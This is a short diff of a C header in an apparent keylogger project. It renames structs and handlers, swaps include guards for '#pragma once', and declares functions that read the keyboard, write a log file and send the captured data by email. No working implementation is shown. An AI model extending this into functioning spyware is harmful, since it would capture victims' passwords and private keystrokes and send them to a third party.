@@ -1,20 +1,16 @@
-#ifndef Keylogger_H_SENTRY
-#define Keylogger_H_SENTRY
+#pragma once
 
-#include "keylogger/file_handler.h"
-#include "keylogger/keyboard_handler.h"
+#include "keylogger/utils/log_file.h"
+#include "keylogger/input_handler.h"
 #include "keylogger/send_email.h"
 
 typedef struct {
-    KeyboardHandler keyboard_handler;
-    FileHandler file_handler;
+    InputHandler input_handler;
+    Logfile log_file;
     EmailSender sender;
-    int fd;
-} HandlerContext;
+} KeyloggerContext;
 
 void *read_keyboard(void *arg);
 void *send_email(void *arg);
-int context_init(HandlerContext *context);
-void context_cleanup(HandlerContext *context);
-
-#endif
+int context_init(KeyloggerContext *context);
+void context_cleanup(KeyloggerContext *context);
